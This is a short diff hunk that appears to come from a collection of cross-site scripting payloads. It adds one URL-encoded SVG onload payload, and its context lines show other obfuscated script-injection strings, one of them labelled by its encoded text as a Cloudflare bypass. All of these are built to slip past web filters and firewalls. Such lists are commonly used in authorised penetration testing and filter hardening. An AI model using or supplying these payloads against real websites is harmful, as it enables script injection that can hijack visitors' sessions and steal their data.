@@ -2746,3 +2746,4 @@ foo<script>alert(1)</script>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 ';k='e'%0Atop['al'+k+'rt'](1)//
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--
